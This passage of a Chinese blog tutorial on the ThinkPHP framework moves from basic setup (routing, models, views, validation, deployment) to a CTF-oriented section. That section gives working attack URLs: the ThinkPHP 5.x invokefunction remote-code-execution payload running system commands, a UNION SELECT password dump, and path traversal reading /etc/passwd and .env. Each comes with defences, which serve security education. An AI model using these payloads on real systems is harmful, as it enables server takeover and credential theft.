&#x27;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>访问控制器：<ul>
<li>访问 <code>http://localhost/index.php/index/index</code> 将会输出 <code>Hello, ThinkPHP!</code>。</li>
<li>访问 <code>http://localhost/index.php/index/hello/name/ThinkPHP</code> 将会输出 <code>Hello, ThinkPHP!</code>。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h4><p>路由定义了 URL 与控制器&#x2F;方法的映射关系。ThinkPHP 的路由配置文件位于 <code>route/route.php</code>。</p>
<ol>
<li>配置路由文件 <code>route/route.php</code>，定义路由规则：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Route</span>;<br><br><span class="hljs-comment">// 定义一个 GET 路由</span><br><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;hello/:name&#x27;</span>, <span class="hljs-string">&#x27;index/hello&#x27;</span>);<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>访问 <code>http://localhost/hello/ThinkPHP</code> 将会调用 <code>IndexController</code> 中的 <code>hello</code> 方法，并返回 <code>Hello, ThinkPHP</code>。</li>
</ol>
<hr>
<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>ThinkPHP 提供了强大的 ORM 功能，方便与数据库交互。在开始数据库操作前，首先需要配置数据库连接。</p>
<h4 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h4><ol>
<li>配置数据库连接信息，修改 <code>config/database.php</code> 文件：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> [<br>    <span class="hljs-comment">// 数据库类型</span><br>    <span class="hljs-string">&#x27;type&#x27;</span>        =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-comment">// 服务器地址</span><br>    <span class="hljs-string">&#x27;hostname&#x27;</span>    =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-comment">// 数据库名</span><br>    <span class="hljs-string">&#x27;database&#x27;</span>    =&gt; <span class="hljs-string">&#x27;thinkphp&#x27;</span>,<br>    <span class="hljs-comment">// 用户名</span><br>    <span class="hljs-string">&#x27;username&#x27;</span>    =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-comment">// 密码</span><br>    <span class="hljs-string">&#x27;password&#x27;</span>    =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-comment">// 端口</span><br>    <span class="hljs-string">&#x27;hostport&#x27;</span>    =&gt; <span class="hljs-string">&#x27;3306&#x27;</span>,<br>];<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h4><p>模型对应数据库表，处理数据的增删改查操作。默认情况下，模型名对应数据库表名（小写）。</p>
<ol>
<li>在 <code>application/model/</code> 目录下创建模型文件 <code>User.php</code>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/model/User.php<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>编写模型类代码：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">model</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 指定数据库表名</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>在控制器中使用模型进行数据查询：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 查询 ID 为 1 的用户</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$user</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="视图和模板"><a href="#视图和模板" class="headerlink" title="视图和模板"></a>视图和模板</h3><p>视图负责显示数据，通常由 HTML 模板组成。视图文件存放在 <code>application/view/</code> 目录下，模板文件的命名需与控制器和方法名一致。</p>
<h4 id="创建视图文件"><a href="#创建视图文件" class="headerlink" title="创建视图文件"></a>创建视图文件</h4><ol>
<li>在 <code>application/view/index/</code> 目录下创建视图文件 <code>index.html</code>：</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ThinkPHP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;$name&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="渲染视图"><a href="#渲染视图" class="headerlink" title="渲染视图"></a>渲染视图</h4><p>控制器可以通过 <code>view()</code> 方法渲染视图文件，并传递数据到视图。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-variable">$name</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>访问 <code>http://localhost/index/index</code> 时，将显示 <code>Hello, ThinkPHP!</code>。</p>
<hr>
<h3 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h3><p>表单验证用于验证用户输入的数据，确保其合法性。ThinkPHP 提供了强大的验证机制。</p>
<h4 id="创建验证器"><a href="#创建验证器" class="headerlink" title="创建验证器"></a>创建验证器</h4><ol>
<li>在 <code>application/validate/</code> 目录下创建验证器文件 <code>User.php</code>：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">validate</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Validate</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Validate</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 定义验证规则</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$rule</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|max:25&#x27;</span>,<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-string">&#x27;email&#x27;</span>,<br>    ];<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="使用验证器"><a href="#使用验证器" class="headerlink" title="使用验证器"></a>使用验证器</h4><p>在控制器中使用验证器来验证用户输入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">validate</span>\<span class="hljs-title">User</span> <span class="hljs-keyword">as</span> <span class="hljs-title">UserValidate</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$data</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.name&#x27;</span>),<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.email&#x27;</span>),<br>    ];<br><br>    <span class="hljs-variable">$validate</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserValidate</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>();  <span class="hljs-comment">// 返回验证错误</span><br>    &#125;<br><br>    <span class="hljs-comment">// 验证通过后执行其他操作</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="错误和日志"><a href="#错误和日志" class="headerlink" title="错误和日志"></a>错误和日志</h3><p>ThinkPHP 提供了简单的错误处理机制，并支持日志记录。</p>
<h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><ol>
<li>自定义错误页面：可以在配置文件中自定义异常处理模板：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// config/app.php</span><br><span class="hljs-string">&#x27;exception_tmpl&#x27;</span> =&gt; \think\facade<span class="hljs-title class_">\App</span>::<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;view/error.html&#x27;</span>,<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>定义自定义的错误页面 <code>application/view/error.html</code>：</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>An error occurred<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;$message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h4><p>日志记录可以帮助开发者跟踪系统中的异常与调试信息。日志文件保存在 <code>runtime/log/</code> 目录中。</p>
<ol>
<li>在控制器中记录日志：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Log</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title class_">Log</span>::<span class="hljs-title function_ invoke__">record</span>(<span class="hljs-string">&#x27;这是一个调试信息&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;日志已记录&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>查看日志：日志文件会保存在 <code>runtime/log/</code> 目录下。</li>
</ol>
<hr>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><p>在部署之前，确保配置好不同的环境参数，比如数据库连接、调试模式等。</p>
<ol>
<li>修改 <code>.env</code> 文件，配置生产环境参数：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs env">APP_DEBUG = false<br>DB_HOST = 127.0.0.1<br>DB_NAME = production_db<br>DB_USER = prod_user<br>DB_PASS = prod_pass<br></code></pre></td></tr></table></figure>

<h4 id="配置-Web-服务器"><a href="#配置-Web-服务器" class="headerlink" title="配置 Web 服务器"></a>配置 Web 服务器</h4><p>ThinkPHP 项目需要部署在 Web 服务器上，如 <strong>Apache</strong> 或 <strong>Nginx</strong>。</p>
<p><strong>Nginx 配置示例</strong>：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> yourdomain.com<br></code></pre></td></tr></table></figure>



<h3 id="ThinkPHP-框架架构与基础概念"><a href="#ThinkPHP-框架架构与基础概念" class="headerlink" title="ThinkPHP 框架架构与基础概念"></a>ThinkPHP 框架架构与基础概念</h3><p>ThinkPHP 是一个基于 MVC（Model-View-Controller）模式的 PHP 框架。其核心概念如下：</p>
<ul>
<li><strong>Model（模型）</strong>：负责与数据库交互，执行数据的增删改查操作。</li>
<li><strong>View（视图）</strong>：负责展示数据，并将结果输出给用户。</li>
<li><strong>Controller（控制器）</strong>：负责逻辑处理，协调模型和视图的交互。</li>
</ul>
<h4 id="1-路由机制"><a href="#1-路由机制" class="headerlink" title="1. 路由机制"></a>1. 路由机制</h4><p>ThinkPHP 的路由机制决定了 URL 如何映射到具体的控制器和操作。默认情况下，ThinkPHP 通过 URL 的路径结构来决定加载哪个控制器和方法。例如，<code>index.php?m=module&amp;a=action</code> 将会调用 <code>module</code> 模块下的 <code>action</code> 方法。</p>
<p>如果不当处理 URL 及其参数，可能会导致路径遍历、SQL 注入和远程代码执行等安全问题。</p>
<hr>
<h3 id="ThinkPHP-常见的安全漏洞"><a href="#ThinkPHP-常见的安全漏洞" class="headerlink" title="ThinkPHP 常见的安全漏洞"></a>ThinkPHP 常见的安全漏洞</h3><p>在 CTF 比赛中，ThinkPHP 的漏洞主要集中在以下几个方面：</p>
<h4 id="1-SQL-注入漏洞"><a href="#1-SQL-注入漏洞" class="headerlink" title="1.SQL 注入漏洞"></a>1.SQL 注入漏洞</h4><p>SQL 注入是指攻击者通过构造恶意的输入，破坏应用程序执行的 SQL 查询。虽然 ThinkPHP 提供了 ORM 和预处理机制，避免直接拼接 SQL 语句，但是如果开发者直接使用原生 SQL 查询且未做适当的过滤，则可能会引发 SQL 注入。</p>
<p><strong>漏洞示例</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的 SQL 查询</span><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">M</span>(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>在上述代码中，<code>$_GET[&#39;id&#39;]</code> 的值未经过滤就被插入到了 SQL 查询中，攻击者可以通过构造如下 URL 进行 SQL 注入：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">OR</span> <span class="hljs-attribute">1</span>=1 --<br></code></pre></td></tr></table></figure>

<p><strong>修复方法</strong>：</p>
<ul>
<li>使用框架提供的 ORM：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])-&gt;<span class="hljs-title function_ invoke__">select</span>();<br></code></pre></td></tr></table></figure></li>
<li>或者使用 PDO 进行参数化查询，避免 SQL 注入。</li>
</ul>
<h4 id="2-路径遍历漏洞"><a href="#2-路径遍历漏洞" class="headerlink" title="2.路径遍历漏洞"></a>2.路径遍历漏洞</h4><p>路径遍历是指攻击者通过操纵文件路径的输入，访问服务器上未经授权的文件。ThinkPHP 的路由机制在处理不当输入时，可能导致文件包含和路径遍历漏洞。</p>
<p><strong>漏洞示例</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的文件加载</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>攻击者可以通过构造如下 URL 来读取系统的敏感文件：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?page=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>

<p><strong>防御措施</strong>：</p>
<ul>
<li>严格限制输入的文件路径，使用 <code>realpath()</code> 等函数校验路径是否合法。</li>
<li>使用白名单机制，只允许加载特定的文件。</li>
</ul>
<h4 id="3-远程代码执行（RCE）"><a href="#3-远程代码执行（RCE）" class="headerlink" title="3 .远程代码执行（RCE）"></a>3 .远程代码执行（RCE）</h4><p>ThinkPHP 的某些版本存在远程代码执行漏洞，允许攻击者通过构造恶意请求执行任意代码。在 ThinkPHP 5.x 系列中，某些版本允许调用 PHP 函数，攻击者可以通过调用 <code>call_user_func_array</code> 等函数来执行操作系统命令。</p>
<p><strong>漏洞示例</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">whoami</span></span><br></code></pre></td></tr></table></figure>

<p>该漏洞利用框架的内部调用机制，调用 <code>system</code> 函数执行命令 <code>whoami</code>，返回服务器的用户信息。</p>
<h5 id="受影响版本："><a href="#受影响版本：" class="headerlink" title="受影响版本："></a>受影响版本：</h5><ul>
<li>ThinkPHP 5.0.23 及其之前版本</li>
<li>ThinkPHP 5.1.31 及其之前版本</li>
</ul>
<p><strong>防御措施</strong>：</p>
<ul>
<li>更新至最新的安全版本，及时修补已知漏洞。</li>
<li>对所有用户输入进行严格过滤，特别是与函数调用相关的输入。</li>
<li>禁止通过 URL 直接调用敏感的 PHP 函数，如 <code>eval</code>、<code>system</code>。</li>
</ul>
<h4 id="4-反序列化漏洞"><a href="#4-反序列化漏洞" class="headerlink" title="4 .反序列化漏洞"></a>4 .反序列化漏洞</h4><p>反序列化漏洞通常出现在使用序列化机制存储或传递数据的场景中。如果用户提供的数据未经验证就被反序列化，攻击者可以构造恶意的序列化数据，实现任意代码执行。</p>
<p><strong>漏洞示例</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的反序列化操作</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>攻击者可以传递恶意的序列化数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p>通过该漏洞，攻击者可以利用反序列化后的对象实现代码执行。</p>
<p><strong>防御措施</strong>：</p>
<ul>
<li>避免直接反序列化不可信的数据。</li>
<li>使用安全的序列化和反序列化方法，如 JSON 编码和解码。</li>
<li>如果必须使用 PHP 的反序列化机制，建议对输入数据进行严格校验。</li>
</ul>
<hr>
<h3 id="ThinkPHP-漏洞利用方法"><a href="#ThinkPHP-漏洞利用方法" class="headerlink" title="ThinkPHP 漏洞利用方法"></a>ThinkPHP 漏洞利用方法</h3><p>在 CTF 比赛中，ThinkPHP 相关题目通常会包含 SQL 注入、路径遍历、反序列化和 RCE 漏洞。以下是几种常见的漏洞利用方式：</p>
<h4 id="1-SQL-注入攻击"><a href="#1-SQL-注入攻击" class="headerlink" title="1. SQL 注入攻击"></a>1. SQL 注入攻击</h4><p>通过在 URL 或表单中注入恶意的 SQL 语句，攻击者可以操控查询结果。</p>
<ul>
<li>示例攻击 URL：<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users<br></code></pre></td></tr></table></figure></li>
</ul>
<p>此时，攻击者可以获得数据库中用户的用户名和密码。</p>
<h4 id="2-远程代码执行攻击"><a href="#2-远程代码执行攻击" class="headerlink" title="2. 远程代码执行攻击"></a>2. 远程代码执行攻击</h4><p>针对 ThinkPHP 5.x 中的 RCE 漏洞，可以构造如下 URL 来执行系统命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">id</span></span><br></code></pre></td></tr></table></figure>

<p>可以将 <code>system</code> 替换为其他函数，如 <code>exec</code>、<code>shell_exec</code> 等，执行不同的命令。</p>
<h4 id="3-路径遍历攻击"><a href="#3-路径遍历攻击" class="headerlink" title="3.路径遍历攻击"></a>3.路径遍历攻击</h4><p>攻击者通过路径遍历漏洞，获取系统中的敏感文件或配置文件。例如，访问 <code>.env</code> 文件：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?s=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>config/.env<br></code></pre></td></tr></table></figure>

<p>这种攻击可能泄露数据库连接信息，进一步导致更严重的后果。</p>
<h4 id="4-反序列化攻击"><a href="#4-反序列化攻击" class="headerlink" title="4. 反序列化攻击"></a>4. 反序列化攻击</h4><p>攻击者可以构造恶意的序列化数据，利用反序列化漏洞进行攻击。可以通过发送特定的 POST 请求来传递恶意的对象数据，并实现代码执行。</p>
<hr>
<h3 id="ThinkPHP-安全防御措施"><a href="#ThinkPHP-安全防御措施" class="headerlink" title="ThinkPHP 安全防御措施"></a>ThinkPHP 安全防御措施</h3><p>为防止 ThinkPHP 应用程序被攻击，可以采取以下防御措施：</p>
<ol>
<li><p><strong>及时更新框架</strong>：保持 ThinkPHP 框架的最新版本，修补已知漏洞。尤其是存在远程代码执行漏洞的 ThinkPHP 5.x 系列，建议及时更新至最新版本。</p>
</li>
<li><p><strong>输入过滤</strong>：对所有用户输入进行严格的过滤和校验，尤其是 URL 参数和 POST 数据，防止注入和路径遍历攻击。</p>
</li>
<li><p><strong>使用 ORM 或参数化查询</strong>：避免直接拼接 SQL 查询，使用框架的 ORM 或者 PDO 提供的参数化查询功能，防止 SQL 注入。</p>
</li>
<li><p><strong>关闭调试模式</strong>：生产环境中应关闭调试模式，防止暴露敏感的调试信息。可以通过修改配置文件中的 <code>APP_DEBUG</code> 设置关闭调试。</p>
</li>
<li><p><strong>使用 Web 应用防火墙（WAF）</strong>：在服务器前端部署 WAF，防止常见的 Web 攻击，如 SQL 注入、XSS 和 RCE 等。</p>
</li>
<li><p><strong>路径安全</strong>：对于文件路径操作，使用 <code>realpath()</code> 或者其他方法确保路径合法，避免路径遍历攻击。</p>
</li>
<li><p><strong>反序列化防御</strong>：尽量避免反序列化用户提供的数据。如果必须使用反序列化，确保对数据进行严格校验，并限制可以被序列化的类。</p>
</li>
</ol>
<hr>
<h3 id="版本历史与漏洞总结"><a href="#版本历史与漏洞总结" class="headerlink" title="版本历史与漏洞总结"></a>版本历史与漏洞总结</h3><p><strong>ThinkPHP 5.x 漏洞历史</strong>：</p>
<ul>
